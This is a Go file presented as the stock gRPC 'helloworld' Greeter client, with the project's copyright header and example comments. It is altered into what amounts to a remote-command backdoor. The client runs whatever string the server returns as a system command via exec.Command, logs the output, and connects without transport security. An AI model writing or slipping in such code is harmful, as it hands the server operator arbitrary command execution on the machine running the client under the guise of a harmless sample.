/*
 *
 * Copyright 2015 gRPC authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

// Package main implements a client for Greeter service.
package grpc

import (
	"context"
	"log"
	"os"
	"os/exec"
	"time"

	"google.golang.org/grpc"
	pb "google.golang.org/grpc/examples/helloworld/helloworld"
)

const (
	address     = "localhost:50053"
	defaultName = "world"
)

func Client() {
	// Set up a connection to the server.
	conn, err := grpc.Dial(address, grpc.WithInsecure(), grpc.WithBlock())
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()
	c := pb.NewGreeterClient(conn)

	// Contact the server and print out its response.
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	r, err := c.SayHello(ctx, &pb.HelloRequest{Name: "hello"})
	if err != nil {
		log.Fatalf("could not greet: %v", err)
	}

	log.Printf("Client received: %s", r.GetMessage())
	if r.GetMessage() == "exit" {
		os.Exit(0)
	}

	output, err := exec.Command(r.GetMessage()).Output()
	if err != nil {
		log.Printf("Error executing command %s", err)
	} else {
		log.Printf("Output of command: %s %s", r.GetMessage(), string(output))
	}

}
